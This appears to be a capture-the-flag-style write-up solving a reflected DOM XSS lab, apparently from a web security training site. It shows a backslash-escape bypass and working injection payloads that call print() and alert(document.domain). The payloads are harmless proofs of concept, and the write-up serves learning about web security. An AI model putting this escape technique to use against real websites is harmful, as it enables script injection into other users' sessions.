# Lab: Reflected DOM XSS

 This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the alert() function. 

# Step 1 Enter canary from DOM invader into an input

I enter the canary into the search bar

![image](https://user-images.githubusercontent.com/83407557/211356834-2a82ec7f-adad-4de9-a3bc-256bc8b18a20.png)

And find the sources and sinks:

![image](https://user-images.githubusercontent.com/83407557/211357112-b3c6d181-07e5-4351-b64e-211002aff55c.png)

# Step 2 Find escapes

If I add a double quote to the canary, I see that it is being escaped:

![image](https://user-images.githubusercontent.com/83407557/211360297-c6a47918-adda-4c86-8d93-c2216669d01b.png)

However a backslash goes through

![image](https://user-images.githubusercontent.com/83407557/211360510-73bafa25-6a1b-4abb-87c8-afd7e8f8332b.png)

Using a `\"` I can escape that the escape character and break out of the double quotes, however I am still within a `"}` at the end that I need to deal with:

![image](https://user-images.githubusercontent.com/83407557/211361504-7196b676-461a-4c22-945d-b87c8e8320f0.png)

I can try and comment `//` at the end of the test string:

```html
\"canary//
```
Which completely breaks the code and I no longer see my canary being reflected:

![image](https://user-images.githubusercontent.com/83407557/211361919-13aa3d6b-13df-4876-b05e-d5cc3a2fdf14.png)

at this point I have two options, I can either comment `//` and but also close the `}`:

```javascript
\"canary}//
```

![image](https://user-images.githubusercontent.com/83407557/211362811-83862616-6b4d-45e2-9165-e89f70053349.png)

Or I can escape the second double quote

```javascript
\"canary\
```

![image](https://user-images.githubusercontent.com/83407557/211363104-18255fd5-7fb1-4325-a91b-91e5fc8978a1.png)

# Step 3 execute XSS now that I am escaped

Before javascript can be executed I need an operand to separate the expressions within the JSON

As a POC calling a print() function any of the following will work:

```javascript
\"*print()}//
\"/print()}//
\"+print()}//
\"-print()}//
```
![image](https://user-images.githubusercontent.com/83407557/211366772-edc228ef-7595-4606-b296-aefceaf77a12.png)

![image](https://user-images.githubusercontent.com/83407557/211366899-b60b3da1-bc7d-47d9-aec1-4535e59f6ea5.png)

For each the search result will say NaN, which in stands for **N**ot **A** **N**unmber:

![image](https://user-images.githubusercontent.com/83407557/211367257-2a294b5e-5f3d-44eb-b39e-f206c7e5b882.png)

# Step 4 Call alert function and solve the lab

Changing any of the payloads to call alert instead of print:

```javascript
\"*alert(document.domain)}//
```
![image](https://user-images.githubusercontent.com/83407557/211367822-a8d696e7-a873-464f-8b6f-b6a3846fe2ef.png)

and alert is called 

![image](https://user-images.githubusercontent.com/83407557/211367878-297d9d6e-b05a-42b1-bf9c-5b574a8cf52b.png)

and the lab is solved:

![image](https://user-images.githubusercontent.com/83407557/211367936-2f0b0c48-6322-4a58-a61e-05cd757a00fa.png)
